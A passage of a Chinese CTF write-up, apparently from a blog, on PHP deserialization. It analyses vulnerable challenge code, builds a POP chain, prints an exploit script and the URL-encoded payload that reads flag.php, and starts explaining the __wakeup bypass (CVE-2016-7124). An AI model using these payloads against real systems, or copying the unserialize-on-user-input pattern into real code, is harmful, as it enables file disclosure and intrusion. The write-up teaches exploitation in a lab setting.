class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们来分析构造POP链的过程，通过对源码的通看，我们可以很快定位到下面的这一坨，从这一坨可以知道，通过get传参，并反序列化，上面定义了3个类：Show、Test、Read    我们想要通过构造反序列化来读取flag.php，那就需要一些读取文件的函数，那其实我们更想利用到Read这个类里面的功能，来实现读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>切入点:</p><p>为读取flag 文件，首先切入点在于：通过 unserialize 反序列化这个可控的点, 来传入一串特定的序列化的payload ，来触发代码中的魔法函数，从而构建一条pop 链</p></blockquote><ol><li><p>既然是读取文件，首先应考虑的是能够读取文件的函数，从源码中，可知 能够去读取文件的魔法函数有: highlight_file 、file_get_contents、 这两个函数，但是我们第一个能够利用的点是：unserialize , 而 unserialize 能够触发 __wakeup 这个魔法函数，而这个魔法函数又在show 这个类里面，回溯到show 这个类中，__wakeup 这个魔法函数中，很明显，preg_match 这个正则表达式把source 这个在show 类中的对象 当作字符串去正则匹配了，所以此时会触发  __toString 这个魔法函数</p></li><li><p>在 __toString 这个魔法函数中，取show 这个类中的str对象数组中的str 字符 ，用来引用在 source 对象（属性与方法），如果不存在的话，就触发了__get 魔法函数（读取不可访问或不存在的属性时被调用）</p></li><li><p>上面触发了__get 魔法函数，就到 Test 类中的__get 魔法函数了，而在此魔法函数中，首先取 Test 类中对象p的属性和方法，再赋值给 function 变量，最后通过 return $function() 来把它当作函数执行，这里就触发了 __invoke 魔法函数</p></li><li><p>__invoke 魔法函数又在 Read 类中，在__invoke 中，调用了在 Read类中的 file_get 方法</p></li><li><p>在此方法中，value这个形参为可控的，最后能够去调用 file_get_contents 函数去读取文件内容，ps: 只需要将 file_get 方法中的形参改为 我们想要读取的flag.php 文件，就可以去读取到最后的flag了</p></li></ol><h4 id="POP链结构最后的大致流程图为"><a href="#POP链结构最后的大致流程图为" class="headerlink" title="POP链结构最后的大致流程图为:"></a>POP链结构最后的大致流程图为:</h4><p>Unserialize(可控变量)  ——&gt;  __wakeup ——&gt; __toString ——&gt; __get  ——&gt; __invoke ——&gt; 触发Read类中file_get 方法中的 file_get_contents 函数 去读取flag.php</p><h4 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//赋值Test类的对象($t)下的属性p为Read类的对象($r)，触发__invoke魔术方法</span></span><br><span class="line"><span class="variable">$t</span>-&gt;p = <span class="variable">$r</span>; </span><br><span class="line"><span class="comment">//赋值Show类的对象($s)下的str数组的str键的值为 Test类的对象$t ，触发__get魔术方法。</span></span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$t</span>;</span><br><span class="line"><span class="comment">//令Show类的对象($s)下的source属性值为此时上一步已经赋值过的$s对象，从而把对象当作字符串调用触发__tostring</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source = <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">// 这里使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)));</span><br></pre></td></tr></table></figure><p>得到最后的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>Br%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Read%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>flag.php%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><blockquote><p>在构造的过程中，个人觉得还是要比较清晰的知道要干什么，怎么实现它？，上面的构造涉及到的类还是比较少的，如果涉及的类很多后面就很容易被代码绕晕</p></blockquote><blockquote><p>补充：相关的知识点</p></blockquote><h2 id="PHP反序列化-wakeup-绕过方法漏洞（CVE-2016-7124）"><a href="#PHP反序列化-wakeup-绕过方法漏洞（CVE-2016-7124）" class="headerlink" title="PHP反序列化-__wakeup()绕过方法漏洞（CVE-2016-7124）"></a>PHP反序列化-__wakeup()绕过方法漏洞（CVE-2016-7124）</h2><h3 id="漏洞影响的版本"><a href="#漏洞影响的版本" class="headerlink" title="漏洞影响的版本"></a>漏洞影响的版本</h3><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><br><h3 id="漏洞的利用方法"><a href="#漏洞的利用方法" class="headerlink" title="漏洞的利用方法"></a>漏洞的利用方法</h3><p>若在对象的魔法函数中存在的__wakeup方法，那么之后再调用 unserilize() 方法进行反序列化之前则会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><br><h3 id="漏洞出现情况"><a href="#漏洞出现情况" class="headerlink" title="漏洞出现情况"></a>漏洞出现情况</h3><ol><li>可以之间或简介控制序列化结果</li><li>__wakeup()函数会强制修改某些内容</li></ol><br><h3 id="看例子-极客大挑战-2019-PHP"><a href="#看例子-极客大挑战-2019-PHP" class="headerlink" title="看例子: [极客大挑战 2019]PHP"></a>看例子: [极客大挑战 2019]PHP</h3><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYHbG.png" data-caption="zYHbG.png"><img src="https://i.imgtg.com/2022/05/11/zYHbG.png" alt="zYHbG.png"></a></p><blockquote><p>初看什么都没有，通过访问备份路径，得到一个 <a href="http://www.zip，打开分别是：">www.zip，打开分别是：</a> class.php , index.php , flag.php</p></blockquote><p>分别看下这几个文件：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;</span><br><span class="line">      &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    <span class="comment">#login&#123;   </span></span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: <span class="number">50</span>%;   </span><br><span class="line">        left:<span class="number">50</span>%;   </span><br><span class="line">        margin: -<span class="number">150</span>px <span class="number">0</span> <span class="number">0</span> -<span class="number">150</span>px;   </span><br><span class="line">        width: <span class="number">300</span>px;   </span><br><span class="line">        height: <span class="number">300</span>px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: <span class="number">2</span>em;   </span><br><span class="line">        margin: <span class="number">0.67</span>em <span class="number">0</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">&quot;world&quot;</span>&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="string">&quot;center&quot;</span> style=<span class="string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=<span class="string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>先看index.php 首先包含了一个class.php , 变量select 通过get方法获取参数，并将select反序列化的结果赋值给res.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们再来看下class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到定义了一个类name，2个私有权限的变量（为什么要提这个呢？涉及到后面的反序列化的特殊构造），3个方法，注意下面这一陀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">global</span> <span 